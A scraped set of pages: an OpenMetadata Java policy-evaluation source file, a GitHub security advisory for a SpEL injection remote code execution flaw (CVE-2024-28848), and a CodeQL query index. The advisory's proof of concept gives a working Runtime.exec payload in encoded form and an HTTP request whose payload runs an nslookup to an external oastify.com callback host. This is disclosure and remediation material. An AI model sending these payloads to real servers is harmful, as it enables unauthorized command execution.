=== Content from github.com_d649c9de_20250111_181753.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fblob%2Fmain%2Fopenmetadata-service%2Fsrc%2Fmain%2Fjava%2Forg%2Fopenmetadata%2Fservice%2Fsecurity%2Fpolicyevaluator%2FCompiledRule.java)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fblob%2Fmain%2Fopenmetadata-service%2Fsrc%2Fmain%2Fjava%2Forg%2Fopenmetadata%2Fservice%2Fsecurity%2Fpolicyevaluator%2FCompiledRule.java)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=open-metadata%2FOpenMetadata)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-metadata](/open-metadata)
/
**[OpenMetadata](/open-metadata/OpenMetadata)**
Public

* [Notifications](/login?return_to=%2Fopen-metadata%2FOpenMetadata) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)
* [Star
   5.9k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)

* [Code](/open-metadata/OpenMetadata)
* [Issues
  396](/open-metadata/OpenMetadata/issues)
* [Pull requests
  92](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects
  0](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

Additional navigation options

* [Code](/open-metadata/OpenMetadata)
* [Issues](/open-metadata/OpenMetadata/issues)
* [Pull requests](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

## Files

 main
## Breadcrumbs

1. [OpenMetadata](/open-metadata/OpenMetadata/tree/main)
2. /[openmetadata-service](/open-metadata/OpenMetadata/tree/main/openmetadata-service)
3. /[src](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src)
4. /[main](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main)
5. /[java](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java)
6. /[org](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org)
7. /[openmetadata](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata)
8. /[service](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata/service)
9. /[security](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata/service/security)
10. /[policyevaluator](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator)
/
# CompiledRule.java

Copy path Blame  Blame
## Latest commit

## History

[History](/open-metadata/OpenMetadata/commits/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator/CompiledRule.java)239 lines (220 loc) · 8.67 KB main
## Breadcrumbs

1. [OpenMetadata](/open-metadata/OpenMetadata/tree/main)
2. /[openmetadata-service](/open-metadata/OpenMetadata/tree/main/openmetadata-service)
3. /[src](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src)
4. /[main](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main)
5. /[java](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java)
6. /[org](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org)
7. /[openmetadata](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata)
8. /[service](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata/service)
9. /[security](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata/service/security)
10. /[policyevaluator](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator)
/
# CompiledRule.java

Top
## File metadata and controls

* Code
* Blame

239 lines (220 loc) · 8.67 KB[Raw](https://github.com/open-metadata/OpenMetadata/raw/refs/heads/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator/CompiledRule.java)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239package org.openmetadata.service.security.policyevaluator;
import static org.openmetadata.service.Entity.ALL\_RESOURCES;import static org.openmetadata.service.exception.CatalogExceptionMessage.permissionDenied;
import com.fasterxml.jackson.annotation.JsonIgnore;import java.util.Iterator;import java.util.List;import java.util.Map;import lombok.extern.slf4j.Slf4j;import org.openmetadata.schema.entity.policies.accessControl.Rule;import org.openmetadata.schema.type.MetadataOperation;import org.openmetadata.schema.type.Permission;import org.openmetadata.schema.type.Permission.Access;import org.openmetadata.schema.type.ResourcePermission;import org.openmetadata.service.exception.CatalogExceptionMessage;import org.openmetadata.service.security.AuthorizationException;import org.openmetadata.service.security.policyevaluator.SubjectContext.PolicyContext;import org.springframework.expression.Expression;import org.springframework.expression.spel.standard.SpelExpressionParser;import org.springframework.expression.spel.support.SimpleEvaluationContext;
/\*\* This class is used in a single threaded model and hence does not have concurrency support \*/@Slf4jpublic class CompiledRule extends Rule { private static final SpelExpressionParser EXPRESSION\_PARSER = new SpelExpressionParser(); @JsonIgnore private Expression expression;
 public CompiledRule(Rule rule) { super(); this.withName(rule.getName()) .withDescription(rule.getDescription()) .withCondition(rule.getCondition()) .withEffect(rule.getEffect()) .withOperations(rule.getOperations()) .withResources(rule.getResources()); }
 public static Expression parseExpression(String condition) { if (condition == null) { return null; } try { return EXPRESSION\_PARSER.parseExpression(condition); } catch (Exception exception) { throw new IllegalArgumentException( CatalogExceptionMessage.failedToParse(exception.getMessage())); } }
 /\*\* Used only for validating the expressions when new rule is created \*/ public static <T> void validateExpression(String condition, Class<T> clz) { if (condition == null) { return; } Expression expression = parseExpression(condition); RuleEvaluator ruleEvaluator = new RuleEvaluator(); SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding() .withInstanceMethods() .withRootObject(ruleEvaluator) .build(); try { expression.getValue(context, clz); } catch (Exception exception) { // Remove unnecessary class details in the exception message String message = exception.getMessage().replaceAll("on type .\*$", "").replaceAll("on object .\*$", ""); throw new IllegalArgumentException(CatalogExceptionMessage.failedToEvaluate(message)); } }
 public Expression getExpression() { if (this.getCondition() == null) { return null; } if (expression == null) { expression = parseExpression(getCondition()); } return expression; }
 public void evaluateDenyRule( OperationContext operationContext, SubjectContext subjectContext, ResourceContextInterface resourceContext, PolicyContext policyContext) { if (getEffect() != Effect.DENY || !matchResource(operationContext.getResource())) { return; }
 List<MetadataOperation> operations = operationContext.getOperations(resourceContext); for (MetadataOperation operation : operations) { if (matchOperation(operation)) { LOG.debug( "operation {} denied by {}{}{}", operation, policyContext.getRoleName(), policyContext.getPolicyName(), getName()); if (matchExpression(policyContext, subjectContext, resourceContext)) { throw new AuthorizationException( permissionDenied( subjectContext.user().getName(), operation, policyContext.getRoleName(), policyContext.getPolicyName(), getName())); } } } }
 private Access getAccess() { if (getCondition() != null) { return getEffect() == Effect.DENY ? Access.CONDITIONAL\_DENY : Access.CONDITIONAL\_ALLOW; } return getEffect() == Effect.DENY ? Access.DENY : Access.ALLOW; }
 public void evaluateAllowRule( OperationContext operationContext, SubjectContext subjectContext, ResourceContextInterface resourceContext, PolicyContext policyContext) { if (getEffect() != Effect.ALLOW || !matchResource(operationContext.getResource())) { return; }
 Iterator<MetadataOperation> iterator = operationContext.getOperations(resourceContext).listIterator(); while (iterator.hasNext()) { MetadataOperation operation = iterator.next(); if (matchOperation(operation) && matchExpression(policyContext, subjectContext, resourceContext)) { LOG.debug("operation {} allowed", operation); iterator.remove(); } } }
 public void evaluatePermission( Map<String, ResourcePermission> resourcePermissionMap, PolicyContext policyContext) { for (ResourcePermission resourcePermission : resourcePermissionMap.values()) { evaluatePermission(resourcePermission.getResource(), resourcePermission, policyContext); } }
 public void evaluatePermission( String resource, ResourcePermission resourcePermission, PolicyContext policyContext) { if (!matchResource(resource)) { return; } Access access = getAccess(); // Walk through all the operations in the rule and set permissions for (Permission permission : resourcePermission.getPermissions()) { if (matchOperation(permission.getOperation()) && overrideAccess(access, permission.getAccess())) { permission .withAccess(access) .withRole(policyContext.getRoleName()) .withPolicy(policyContext.getPolicyName()) .withRule(this); LOG.debug("Updated permission {}", permission); } } }
 public void evaluatePermission( SubjectContext subjectContext, ResourceContextInterface resourceContext, ResourcePermission resourcePermission, PolicyContext policyContext) { if (!matchResource(resourceContext.getResource())) { return; } // Walk through all the operations in the rule and set permissions for (Permission permission : resourcePermission.getPermissions()) { if (matchOperation(permission.getOperation()) && matchExpression(policyContext, subjectContext, resourceContext)) { Access access = getEffect() == Effect.DENY ? Access.DENY : Access.ALLOW; if (overrideAccess(access, permission.getAccess())) { permission .withAccess(access) .withRole(policyContext.getRoleName()) .withPolicy(policyContext.getPolicyName()) .withRule(this); LOG.debug("Updated permission {}", permission); } } } }
 protected boolean matchResource(String resource) { return (getResources().get(0).equalsIgnoreCase(ALL\_RESOURCES) || getResources().contains(resource)); }
 private boolean matchOperation(MetadataOperation operation) { List<MetadataOperation> operations = getOperations(); if (operations.contains(MetadataOperation.ALL)) { LOG.debug("matched all operations"); return true; // Match all operations } if (operations.contains(MetadataOperation.EDIT\_ALL) && OperationContext.isEditOperation(operation)) { LOG.debug("matched editAll operations"); return true; } if (operations.contains(MetadataOperation.VIEW\_ALL) && OperationContext.isViewOperation(operation)) { LOG.debug("matched viewAll operations"); return true; } return getOperations().contains(operation); }
 private boolean matchExpression( PolicyContext policyContext, SubjectContext subjectContext, ResourceContextInterface resourceContext) { Expression expr = getExpression(); if (expr == null) { return true; } RuleEvaluator ruleEvaluator = new RuleEvaluator(policyContext, subjectContext, resourceContext); SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding() .withInstanceMethods() .withRootObject(ruleEvaluator) .build(); return Boolean.TRUE.equals(expr.getValue(context, Boolean.class)); }
 public static boolean overrideAccess(Access newAccess, Access currentAccess) { // Lower the ordinal number of access overrides higher ordinal number return currentAccess.ordinal() > newAccess.ordinal(); }}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_2958ba4c_20250111_181753.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fsecurity%2Fadvisories%2FGHSA-5xv3-fm7g-865r)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fsecurity%2Fadvisories%2FGHSA-5xv3-fm7g-865r)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=open-metadata%2FOpenMetadata)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-metadata](/open-metadata)
/
**[OpenMetadata](/open-metadata/OpenMetadata)**
Public

* [Notifications](/login?return_to=%2Fopen-metadata%2FOpenMetadata) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)
* [Star
   5.9k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)

* [Code](/open-metadata/OpenMetadata)
* [Issues
  396](/open-metadata/OpenMetadata/issues)
* [Pull requests
  92](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects
  0](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

Additional navigation options

* [Code](/open-metadata/OpenMetadata)
* [Issues](/open-metadata/OpenMetadata/issues)
* [Pull requests](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

# SpEL Injection in `GET /api/v1/policies/validation/condition/<expr>` (`GHSL-2023-236`)

Moderate

[tutte](/tutte)
published
GHSA-5xv3-fm7g-865r
Mar 15, 2024

## Package

No package listed

## Affected versions

< 1.2.4

## Patched versions

1.2.4

## Description

### SpEL Injection in `GET /api/v1/policies/validation/condition/<expr>` (`GHSL-2023-236`)

***Please note, only authenticated users have access to PUT / POST APIS for /api/v1/policies. Non authenticated users will not be able to access these APIs to exploit the vulnerability. A user must exist in OpenMetadata and have authenticated themselves to exploit this vulnerability.***

The [`‎CompiledRule::validateExpression`](https://github.com/open-metadata/OpenMetadata/blob/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator/CompiledRule.java#L51) method evaluates an SpEL expression using an [`StandardEvaluationContext`](https://github.com/open-metadata/OpenMetadata/blob/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator/CompiledRule.java#L57), allowing the expression to reach and interact with Java classes such as `java.lang.Runtime`, leading to Remote Code Execution. The `/api/v1/policies/validation/condition/<expression>` endpoint passes user-controlled data `CompiledRule::validateExpession` allowing authenticated (non-admin) users to execute arbitrary system commands on the underlaying operating system.

[Snippet from PolicyResource.java](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/policies/PolicyResource.java#L448)

```
  @GET
  @Path("/validation/condition/{expression}")
  @Operation(
      operationId = "validateCondition",
      summary = "Validate a given condition",
      description = "Validate a given condition expression used in authoring rules.",
      responses = {
        @ApiResponse(responseCode = "204", description = "No value is returned"),
        @ApiResponse(responseCode = "400", description = "Invalid expression")
      })
  public void validateCondition(
      @Context UriInfo uriInfo,
      @Context SecurityContext securityContext,
      @Parameter(description = "Expression of validating rule", schema = @Schema(type = "string"))
          @PathParam("expression")
          String expression) {
    CompiledRule.validateExpression(expression, Boolean.class);
  }
```

```
  public static <T> void validateExpression(String condition, Class<T> clz) {
    if (condition == null) {
      return;
    }
    Expression expression = parseExpression(condition);
    RuleEvaluator ruleEvaluator = new RuleEvaluator();
    StandardEvaluationContext evaluationContext = new StandardEvaluationContext(ruleEvaluator);
    try {
      expression.getValue(evaluationContext, clz);
    } catch (Exception exception) {
      // Remove unnecessary class details in the exception message
      String message = exception.getMessage().replaceAll("on type .*$", "").replaceAll("on object .*$", "");
      throw new IllegalArgumentException(CatalogExceptionMessage.failedToEvaluate(message));
    }
  }
```

In addition, there is a missing authorization check since `Authorizer.authorize()` is never called in the affected path and therefore any authenticated non-admin user is able to trigger this endpoint and evaluate arbitrary SpEL expressions leading to arbitrary command execution.

This vulnerability was discovered with the help of CodeQL's [Expression language injection (Spring)](https://codeql.github.com/codeql-query-help/java/java-spel-expression-injection/) query.

#### Proof of concept

* Prepare the payload
  + Encode `touch /tmp/pwned` in Base64 => `dG91Y2ggL3RtcC9wd25lZA==`
  + SpEL expression to run system command: `T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode("dG91Y2ggL3RtcC9wd25lZA==")))`
  + Encode the payload using URL encoding:

```
%54%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%54%28%6a%61%76%61%2e%75%74%69%6c%2e%42%61%73%65%36%34%29%2e%67%65%74%44%65%63%6f%64%65%72%28%29%2e%64%65%63%6f%64%65%28%22%64%47%39%31%59%32%67%67%4c%33%52%74%63%43%39%77%64%32%35%6c%5a%41%3d%3d%22%29%29%29

```

* Send the payload using a valid JWT token:

```
GET /api/v1/policies/validation/condition/%54%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%54%28%6a%61%76%61%2e%75%74%69%6c%2e%42%61%73%65%36%34%29%2e%67%65%74%44%65%63%6f%64%65%72%28%29%2e%64%65%63%6f%64%65%28%22%62%6e%4e%73%62%32%39%72%64%58%41%67%61%58%70%73%4e%7a%45%33%62%33%42%69%62%57%52%79%5a%57%46%6f%61%33%4a%6f%63%44%4e%72%63%32%70%72%61%47%4a%75%4d%6d%4a%7a%65%6d%67%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%3d%22%29%29%29 HTTP/2
Host: sandbox.open-metadata.org
Authorization: Bearer <non-admin JWT>
```

* Verify that a file called `/tmp/pwned` was created in the OpenMetadata server

#### Impact

This issue may lead to Remote Code Execution by a registered and authenticated user.

#### Remediation

Use [`SimpleEvaluationContext`](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html) to exclude *references to Java types, constructors, and bean references*.

### Severity

Moderate

6.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
High

User interaction
Required

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:H

### CVE ID

CVE-2024-28848

### Weaknesses

[CWE-94](/advisories?query=cwe%3A94)

### Credits

* [![@pwntester](https://avatars.githubusercontent.com/u/125701?s=40&v=4)](/pwntester)
  [pwntester](/pwntester)
  Finder

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from codeql.github.com_0c051879_20250111_181752.html ===

[CodeQL documentation](https://codeql.github.com/docs)

CodeQL resources

* [CodeQL overview](https://codeql.github.com/docs/codeql-overview)
CodeQL guides
* [Writing CodeQL queries](https://codeql.github.com/docs/writing-codeql-queries)
* [CodeQL language guides](https://codeql.github.com/docs/codeql-language-guides)
  Reference docs
  * [QL language
    reference](https://codeql.github.com/docs/ql-language-reference/)* [CodeQL
      standard-libraries](https://codeql.github.com/codeql-standard-libraries)* [CodeQL
        query help](https://codeql.github.com/codeql-query-help)
        Source files
        * [CodeQL repository](https://github.com/github/codeql)
          Academic
          * [QL publications](https://codeql.github.com/publications)

* [CodeQL query help for C and C++](../../cpp/)
* [CodeQL query help for C#](../../csharp/)
* [CodeQL query help for Go](../../go/)
* [CodeQL query help for Java and Kotlin](../)
  + [Access Java object methods through JavaScript exposure](../java-android-webview-addjavascriptinterface/)
  + [Access to unsupported JDK-internal API](../java-jdk-internal-api-access/)
  + [Android APK installation](../java-android-arbitrary-apk-installation/)
  + [Android Intent redirection](../java-android-intent-redirection/)
  + [Android WebSettings file access](../java-android-websettings-file-access/)
  + [Android WebView JavaScript settings](../java-android-websettings-javascript-enabled/)
  + [Android WebView settings allows access to content links](../java-android-websettings-allow-content-access/)
  + [Android Webview debugging enabled](../java-android-webview-debugging-enabled/)
  + [Android `WebView` that accepts all certificates](../java-improper-webview-certificate-validation/)
  + [Android debuggable attribute enabled](../java-android-debuggable-attribute-enabled/)
  + [Android fragment injection](../java-android-fragment-injection/)
  + [Android fragment injection in PreferenceActivity](../java-android-fragment-injection-preference-activity/)
  + [Android missing certificate pinning](../java-android-missing-certificate-pinning/)
  + [Android sensitive keyboard cache](../java-android-sensitive-keyboard-cache/)
  + [AnnotationPresent check](../java-ineffective-annotation-present-check/)
  + [Application backup allowed](../java-android-backup-enabled/)
  + [Arbitrary file access during archive extraction (”Zip Slip”)](../java-zipslip/)
  + [Array index out of bounds](../java-index-out-of-bounds/)
  + [Bad implementation of an event Adapter](../java-wrong-swing-event-adapter-signature/)
  + [Bad suite method](../java-wrong-junit-suite-signature/)
  + [Boxed variable is never null](../java-non-null-boxed-variable/)
  + [Building a command line with string concatenation](../java-concatenated-command-line/)
  + [Building a command with an injected environment variable](../java-exec-tainted-environment/)
  + [Call to Iterator.remove may fail](../java-iterator-remove-failure/)
  + [Cast from abstract to concrete collection](../java-abstract-to-concrete-cast/)
  + [Chain of ‘instanceof’ tests](../java-chained-type-tests/)
  + [Character passed to StringBuffer or StringBuilder constructor](../java-string-buffer-char-init/)
  + [Class has same name as super class](../java-class-name-matches-super-class/)
  + [Cleartext storage of sensitive information in cookie](../java-cleartext-storage-in-cookie/)
  + [Cleartext storage of sensitive information in the Android filesystem](../java-android-cleartext-storage-filesystem/)
  + [Cleartext storage of sensitive information using ‘Properties’ class](../java-cleartext-storage-in-properties/)
  + [Cleartext storage of sensitive information using `SharedPreferences` on Android](../java-android-cleartext-storage-shared-prefs/)
  + [Cleartext storage of sensitive information using a local database on Android](../java-android-cleartext-storage-database/)
  + [Comparison of identical values](../java-comparison-of-identical-expressions/)
  + [Comparison of narrow type with wide type in loop condition](../java-comparison-with-wider-type/)
  + [Confusing method names because of capitalization](../java-confusing-method-name/)
  + [Confusing non-overriding of package-private method](../java-non-overriding-package-private/)
  + [Confusing overloading of methods](../java-confusing-method-signature/)
  + [Constant interface anti-pattern](../java-constants-only-interface/)
  + [Constant loop condition](../java-constant-loop-condition/)
  + [Container contents are never accessed](../java-unused-container/)
  + [Container contents are never initialized](../java-empty-container/)
  + [Container size compared to zero](../java-test-for-negative-container-size/)
  + [Continue statement that does not continue](../java-continue-in-false-loop/)
  + [Contradictory type checks](../java-contradictory-type-checks/)
  + [Creates empty ZIP file entry](../java-empty-zip-file-entry/)
  + [Cross-site scripting](../java-xss/)
  + [Dangerous non-short-circuit logic](../java-non-short-circuit-evaluation/)
  + [Dangerous runFinalizersOnExit](../java-run-finalizers-on-exit/)
  + [Depending upon JCenter/Bintray as an artifact repository](../java-maven-dependency-upon-bintray/)
  + [Deprecated method or constructor invocation](../java-deprecated-call/)
